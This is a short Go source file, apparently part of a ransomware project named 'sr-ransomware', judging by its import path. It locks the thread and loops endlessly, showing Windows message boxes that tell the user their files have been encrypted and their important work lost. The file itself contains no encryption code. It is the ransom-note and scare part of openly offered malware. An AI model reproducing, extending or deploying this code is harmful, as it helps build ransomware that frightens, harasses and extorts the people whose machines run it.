package main

import (
    "runtime"

    "github.com/sug0/sr-ransomware/go/win"
)

func main() {
    runtime.LockOSThread()
    for {
        msgboxTexts()
    }
}

func msgboxTexts() {
    win.MessageBox(
        "Ooopsies!!!!!!!",
        "Looks like your files have been encrypted!",
        win.MB_OK | win.MB_ICONWARNING,
    )
    win.MessageBox(
        "Alright, so what?",
        "All your important work has been lost.",
        win.MB_OK | win.MB_ICONWARNING,
    )
}
